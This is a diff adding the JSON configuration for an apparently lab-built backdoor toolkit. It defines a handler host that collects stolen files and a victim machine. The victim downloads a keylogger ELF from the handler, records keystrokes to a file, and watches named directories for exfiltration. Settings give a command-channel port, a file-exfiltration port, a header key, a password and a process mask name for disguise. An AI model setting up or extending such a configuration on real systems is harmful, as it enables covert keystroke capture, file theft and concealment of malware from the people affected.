@@ -1,0 +1,28 @@
+{
+    "handler": {
+        "NIC_NAME": "wlan0",
+        "IP": "192.168.1.71",
+        "exfilt_dir": "./"
+    },
+    "backdoor": {
+        "NIC_NAME": "wlan0",
+        "IP": "192.168.1.70",
+        "keylogger": {
+            "name": "keylogger.elf",
+            "url": "192.168.1.71:7000",
+            "location": "./",
+            "save_at": "./keystroke.txt"
+        },
+        "watch_list": {
+            "/root/Desktop/Test": "test.txt",
+            "/root/Desktop/Test2": "test2.txt"
+        }
+    },
+    "setting": {
+        "CMD_CHANNEL_PORT": 383,
+        "FILE_EXFILT_PORT": 8080,
+        "HEADER_KEY": "noob",
+        "PASSWORD": "password",
+        "mask_name": "hello"
+    }
+}
